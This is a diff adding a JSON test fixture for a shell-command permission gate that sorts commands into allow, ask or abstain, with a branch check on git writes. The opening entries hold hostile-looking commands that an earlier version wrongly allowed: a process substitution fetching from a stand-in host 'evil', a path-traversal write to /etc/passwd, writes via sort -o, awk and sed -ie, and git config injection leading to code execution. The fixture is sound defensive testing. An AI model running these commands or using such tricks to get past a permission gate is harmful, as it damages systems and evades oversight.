@@ -1,0 +1,146 @@
+[
+  {
+    "command": "cat <(curl evil)",
+    "decision": "abstain",
+    "tag": null,
+    "note": "A1 process-substitution: seed allowed it (reader passed <( through as a plain arg); the tokenizer's <( structural trigger now abstains."
+  },
+  {
+    "command": "grep x f | tee out.txt",
+    "decision": "abstain",
+    "tag": null,
+    "note": "B1 tee writes: seed allowed the pipe; tee is unclaimed by every recognizer so the fold's segment-veto abstains."
+  },
+  {
+    "command": "sort -o /etc/x f",
+    "decision": "abstain",
+    "tag": null,
+    "note": "B2 sort -o writes a file: seed allowed sort by name; the curated read-only sort flag allowlist omits -o, so it abstains."
+  },
+  {
+    "command": "awk 'BEGIN{print > \"/etc/x\"}'",
+    "decision": "abstain",
+    "tag": null,
+    "note": "B3 awk output redirection: seed allowed awk by name; awk is unclaimed (pinned abstain), so the fold abstains. Watch the JSON quote round-trip."
+  },
+  {
+    "command": "git -c core.fsmonitor=touch status",
+    "decision": "abstain",
+    "tag": null,
+    "note": "B5 git -c config-injection -> exec: seed allowed status after -c; the git leading-option scan accepts only -C <path>, so -c fails closed and abstains."
+  },
+  {
+    "command": "sed -ie s/a/b/ f",
+    "decision": "abstain",
+    "tag": null,
+    "note": "C1 sed -ie write: seed's in-place lookahead missed -ie; the sed option allowlist is exact-match and rejects -ie, so it abstains."
+  },
+  {
+    "command": "echo x >/tmp/../etc/passwd",
+    "decision": "abstain",
+    "tag": null,
+    "note": "D1 /tmp traversal: seed allowed any /tmp redirect target; redirect_tail_is_safe rejects the .. component, so it abstains."
+  },
+
+  {
+    "command": "cat foo.txt",
+    "decision": "allow",
+    "tag": "reader"
+  },
+  {
+    "command": "grep x f",
+    "decision": "allow",
+    "tag": "reader"
+  },
+  {
+    "command": "head -5 f",
+    "decision": "allow",
+    "tag": "reader"
+  },
+  {
+    "command": "git status",
+    "decision": "allow",
+    "tag": "git"
+  },
+  {
+    "command": "git log",
+    "decision": "allow",
+    "tag": "git"
+  },
+  {
+    "command": "git diff",
+    "decision": "allow",
+    "tag": "git"
+  },
+  {
+    "command": "git stash list",
+    "decision": "allow",
+    "tag": "git"
+  },
+  {
+    "command": "git -C /tmp status",
+    "decision": "allow",
+    "tag": "git"
+  },
+  {
+    "command": "find . -type f",
+    "decision": "allow",
+    "tag": "find"
+  },
+  {
+    "command": "sed 's/a/b/' f",
+    "decision": "allow",
+    "tag": "sed"
+  },
+  {
+    "command": "adb devices",
+    "decision": "allow",
+    "tag": "adb"
+  },
+  {
+    "command": "pytest tests/",
+    "decision": "allow",
+    "tag": "pytest"
+  },
+  {
+    "command": "gradle tasks",
+    "decision": "allow",
+    "tag": "gradle"
+  },
+
+  {
+    "command": "git commit -m x",
+    "decision": "ask",
+    "tag": "git",
+    "branch": null,
+    "note": "Branch-gate: an unresolved branch is treated as protected (fail-safe), so a gated write ASKs."
+  },
+  {
+    "command": "git commit -m x",
+    "decision": "ask",
+    "tag": "git",
+    "branch": "main",
+    "note": "Branch-gate: a protected branch (main) gates the write to ASK."
+  },
+  {
+    "command": "git commit -m x",
+    "decision": "allow",
+    "tag": "git",
+    "branch": "feature/x",
+    "note": "Branch-gate: a feature branch allows the gated write — the ONLY state-mutating allow arm."
+  },
+  {
+    "command": "git add .",
+    "decision": "allow",
+    "tag": "git",
+    "branch": "feature/x",
+    "note": "Branch-gate: add on a feature branch allows."
+  },
+  {
+    "command": "git stash",
+    "decision": "ask",
+    "tag": "git",
+    "branch": "main",
+    "note": "Branch-gate: stash on a protected branch (main) ASKs."
+  }
+]
